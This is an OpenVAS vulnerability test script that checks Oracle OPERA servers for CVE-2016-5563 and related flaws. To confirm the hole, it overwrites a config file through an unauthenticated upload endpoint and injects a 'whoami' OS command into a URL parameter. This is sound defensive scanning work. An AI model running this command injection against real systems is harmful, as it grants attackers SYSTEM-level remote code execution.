###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_opera_mult_vuln.nasl 11026 2018-08-17 08:52:26Z cfischer $
#
# Oracle OPERA Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:oracle:hospitality_opera_5_property_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106483");
  script_version("$Revision: 11026 $");
  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:52:26 +0200 (Fri, 17 Aug 2018) $");
  script_tag(name:"creation_date", value:"2016-12-20 08:18:50 +0700 (Tue, 20 Dec 2016)");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");

  script_cve_id("CVE-2016-5565", "CVE-2016-5564", "CVE-2016-5563");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Oracle OPERA Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_oracle_opera_detect.nasl");
  script_mandatory_keys("oracle/opera/installed");

  script_tag(name:"summary", value:"Oracle OPERA is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP request and checks the response.");

  script_tag(name:"insight", value:"Oracle OPERA is prone to multiple vulnerabilities:

  - Remote command execution via OS command injection and remote file inclusion (CVE-2016-5563)

  - Exposure of Oracle SQL Database credentials (CVE-2016-5564)

  - Session hijacking via exposed logs (CVE-2016-5565)");

  script_tag(name:"solution", value:"Update to the latest version of Oracle OPERA.");

  script_xref(name:"URL", value:"http://jackson.thuraisamy.me/oracle-opera.html");
  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

# If we don't get the home directory we assume it is on the D:\ drive
home_env = "D:\micros/opera";

url = "/Operajserv/webarchive/ProcessInfo?pid=0";
req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

# We need to patch first the default.env file
if ("</STATUS><ERROR>java.lang.Exception" >< res) {
  home = eregmatch(pattern: "File (.*)\/operaias/default.env", string: res);
  if (isnull(home[1]))
    exit(0);

  home_env = home[1];
  length = strlen(home_env);

  env_url = "/Operajserv/webarchive/FileReceiver?filename=" + home_env + "\operaias\default.env&crc=" + length +
            "&append=false&trace=on";
  req = http_post_req(port: port, url: env_url, data: home_env,
                      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
  res = http_keepalive_send_recv(port: port, data: req);

  if ("<FILERECEIVER><STATUS>OK</STATUS>" >!< res)
    exit(0);
}

url = "/Operajserv/webarchive/ProcessInfo?pid=0%20%26%20whoami%20>%20" + home_env +
      "\operaias\webtemp\openvas_opera_test.txt%202";
req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);
res_url = "/webtemp/openvas_opera_test.txt";
req = http_get(port: port, item: res_url);
res = http_keepalive_send_recv(port: port, data: req);

if ("nt authority\system" >< res) {
  report = report_vuln_url(port: port, url: res_url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
